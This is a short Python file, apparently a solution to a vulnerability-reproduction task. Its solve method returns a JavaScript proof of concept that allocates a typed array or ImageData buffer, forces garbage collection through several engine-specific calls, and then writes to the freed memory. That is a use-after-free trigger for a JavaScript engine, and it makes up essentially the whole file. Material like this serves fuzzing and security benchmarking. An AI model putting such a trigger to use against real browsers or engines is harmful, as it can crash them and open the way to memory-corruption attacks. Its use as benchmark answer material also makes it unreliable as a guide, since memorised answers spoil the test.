import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "function U(){"
            "try{var b=new ArrayBuffer(64);var a=new Uint8ClampedArray(b);a[0]=1;return a}catch(e){}"
            "try{var i=new ImageData(1,1);var d=i.data;i=null;d[0]=1;return d}catch(e){}"
            "return 0"
            "}"
            "var u=U();"
            "try{gc();gc();gc()}catch(e){}"
            "try{collect_garbage()}catch(e){}"
            "try{collectGarbage()}catch(e){}"
            "if(u){u[0]=2;u[0]}\n"
        )
        return poc.encode("utf-8")